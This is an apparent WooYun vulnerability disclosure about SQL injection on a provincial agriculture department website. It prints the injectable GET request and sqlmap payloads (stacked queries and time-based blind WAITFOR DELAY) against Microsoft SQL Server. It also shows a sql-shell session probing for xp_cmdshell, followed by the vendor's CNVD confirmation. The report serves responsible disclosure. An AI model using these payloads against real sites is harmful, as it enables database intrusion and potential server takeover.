wybug_title: 某省农业部官网SQL注入两处#可获取sql-shell
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-11-28：	细节已通知厂商并且等待厂商处理中									2015-12-02：	厂商已经确认，细节仅向厂商公开									2015-12-12：	细节向核心白帽子及相关领域专家公开									2015-12-22：	细节向普通白帽子公开									2016-01-01：	细节向实习白帽子公开									2016-01-16：	细节向公众公开  简要描述： RT 详细说明：  0x01 漏洞网站
**.**.**.**
0x02 漏洞类型
盲注  GET
0x03 漏洞请求参数
GET /ahwlw/detail.asp?id=99B4CE72-ED95-40C6-A295-5A181BEFF48F&typeid=1 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**:80/Cookie: ASPSESSIONIDSASTRRQC=FDDGAMGCNCHIDKBLJMJCFLAN; _gscu_84751418=48460957liev5014; _gscs_84751418=48460957jwg7l014|pv:15; _gscbrs_84751418=1Host: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*
注入关键字typeid   漏洞证明：  
---Place: GETParameter: typeid    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=99B4CE72-ED95-40C6-A295-5A181BEFF48F&typeid=1; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=99B4CE72-ED95-40C6-A295-5A181BEFF48F&typeid=1 WAITFOR DELAY '0:0:5'-----[11:48:58] [INFO] testing Microsoft SQL Server[11:48:58] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] [11:49:05] [INFO] confirming Microsoft SQL Server[11:49:16] [INFO] adjusting time delay to 3 seconds due to good response times[11:49:20] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 8 or 2012web application technology: ASP, Microsoft IIS 8.0back-end DBMS: Microsoft SQL Server 2008
执行一下sql-shell试试
---Place: GETParameter: typeid    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: id=99B4CE72-ED95-40C6-A295-5A181BEFF48F&typeid=1; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=99B4CE72-ED95-40C6-A295-5A181BEFF48F&typeid=1 WAITFOR DELAY '0:0:5'-----[20:13:43] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 8 or 2012web application technology: ASP, Microsoft IIS 8.0back-end DBMS: Microsoft SQL Server 2008[20:13:43] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTERsql-shell> select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell'[20:13:47] [INFO] fetching SQL SELECT statement query output: 'select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell''[20:13:47] [WARNING] time-based comparison requires larger statistical model, please wait..............................[20:14:00] [INFO] heuristics detected web page charset 'GB2312'[20:14:00] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] [20:14:07] [INFO] retrieved: 5   select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell':    '5'sql-shell>

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-02 17:40 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给安徽分中心，由其后续协调网站管理单位处置。 最新状态： 暂无
